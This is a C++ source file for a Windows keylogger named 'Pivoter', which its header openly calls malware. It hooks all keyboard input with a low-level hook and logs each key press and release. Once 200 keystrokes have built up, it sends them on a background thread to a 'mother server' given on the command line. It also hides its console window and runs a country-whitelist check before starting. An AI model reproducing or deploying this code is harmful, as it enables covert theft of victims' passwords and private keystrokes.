/*
	Project name: Pivoter
	Project 1-Word Description: Malware
	Author: Kevin Jerebica ( Osamu-KJ )
*/

#include <iostream>
#include <string.h>
#include <Windows.h>
#include <WinUser.h>
#include <vector>
#include "codes.h"
#include "connections_pivoter.h"
#include "security_checker.h"

#define DEBUG TRUE
#define KEYS_LIMIT 200
HHOOK keyboard_events_hook; 
std::vector<std::string> virt_codes; 
std::vector<std::string> thread_codes; 
ConnectionsPivoter mother_server_pv = ConnectionsPivoter();

DWORD WINAPI send_codes_thread_function(LPVOID keys) {
	std::vector<std::string>* keys_ptr = static_cast<std::vector<std::string>*>(keys);
	bool res = mother_server_pv.send_codes(*keys_ptr);

	if (DEBUG && !res) {
		std::cout << "Failed sending to the mother server!" << std::endl;
		return 1; 
	}

	return 0; 
}

void stack_codes() {
	if (virt_codes.size() < KEYS_LIMIT)
		return; 
	
	thread_codes = virt_codes; 
	HANDLE thread = CreateThread(NULL, 0, send_codes_thread_function, &thread_codes, 0, NULL);

	virt_codes.clear();
}

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
	switch (wParam) {
	case WM_KEYDOWN: 
	case WM_SYSKEYDOWN: 
	case WM_KEYUP: 
	case WM_SYSKEYUP: 
		KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)lParam; 
		DWORD virt_code = kbd_struct->vkCode; 

		std::string prefix; 
		switch (wParam) {
		case WM_KEYDOWN: 
		case WM_SYSKEYDOWN: 
			prefix = "DOWN_"; 
			break; 
		case WM_KEYUP: 
		case WM_SYSKEYUP: 
			prefix = "UP_"; 
			break; 
		}
		std::string string_key_code = prefix + VIRTUAL_KEY_CODE_TABLE[virt_code].name;
		if (DEBUG) {
			std::cout << "Key pressed: " << string_key_code << std::endl; 
			std::cout << "Len of the vector: " << virt_codes.size() << std::endl; 
		}

		virt_codes.push_back(string_key_code);
		stack_codes();
		break; 
	}
	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
}

/*
ARGUMENTS: 
	- 1: initial mother server ip 
	- 2: whitelisted country
*/
int main(int argc, char** argv) {

	// security Checks 
	if (!check_country(argv[2]))
		return 0; 

	if (argc != 3) {
		std::cout << "Error: wrong use of arguments!" << std::endl; 
		return 1; 
	}

	if (DEBUG)
		for (int i = 0; i < argc; i++)
			std::cout << "Argument " << i << " value: " << argv[i] << std::endl;
	else 
		ShowWindow(GetConsoleWindow(), SW_HIDE);

	mother_server_pv.url = argv[1];
	mother_server_pv.allowed_country = argv[2];

	keyboard_events_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 0, 0); 

	STARTUPINFOA startup_info; 
	PROCESS_INFORMATION process_info; 

	memset(&startup_info, 0, sizeof(STARTUPINFOA)); 
	memset(&process_info, 0, sizeof(PROCESS_INFORMATION)); 
	startup_info.cb = sizeof(startup_info); 
 
	/*BOOL test = CreateProcessA(
		NULL,
		(LPSTR) "curl http://192.168.1.108",
		NULL, 
		NULL, 
		false, 
		CREATE_NO_WINDOW,
		NULL, 
		NULL,
		&startup_info,
		&process_info);
	if (test == FALSE) {
		std::cout << "problem!" << std::endl; 
	}*/
	
	// EVENT LOOP
	while (GetMessage(NULL, NULL, 0, 0)); 

	UnhookWindowsHookEx(keyboard_events_hook);

	return 0; 
}
